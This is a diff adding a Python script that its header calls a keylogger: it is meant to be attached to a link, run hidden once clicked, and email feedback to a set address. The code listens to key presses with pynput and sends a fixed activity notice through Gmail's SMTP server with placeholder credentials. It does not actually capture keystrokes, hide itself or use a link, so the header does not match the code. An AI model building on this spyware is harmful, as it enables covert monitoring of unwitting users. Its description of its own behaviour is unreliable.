@@ -1,0 +1,49 @@
+# Author: Zack Peters
+# Date: 8/10/2022
+# Function: Attaches a keylogger to a link,, once link is click, a keylogger will run in background and send feedback to specified email 
+
+import smtplib
+import time
+from pynput import keyboard
+
+# Email configuration
+SENDER_EMAIL = "your_email@example.com"
+SENDER_PASSWORD = "your_email_password"
+RECEIVER_EMAIL = "receiver_email@example.com"
+SMTP_SERVER = "smtp.gmail.com"
+SMTP_PORT = 587
+
+# Function to send email when activity is detected
+def send_email_notification():
+    try:
+        # Set up the email content
+        subject = "Activity Notification"
+        body = "Typing activity was detected on the system."
+        message = f"Subject: {subject}\n\n{body}"
+
+        # Establish connection to the email server
+        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
+        server.starttls()  # Secure the connection
+        server.login(SENDER_EMAIL, SENDER_PASSWORD)
+        server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, message)
+        server.quit()
+
+        print("Activity report sent via email.")
+    except Exception as e:
+        print(f"Failed to send email: {e}")
+
+# Function to detect key presses
+def on_press(key):
+    print(f"Key {key} pressed.")
+    send_email_notification()
+    time.sleep(10) 
+
+# Set up the listener for keyboard activity
+def start_activity_monitoring():
+    print("Starting activity monitoring. Press any key to trigger notification.")
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
+
+# Main entry point for the script
+if __name__ == "__main__":
+    start_activity_monitoring()
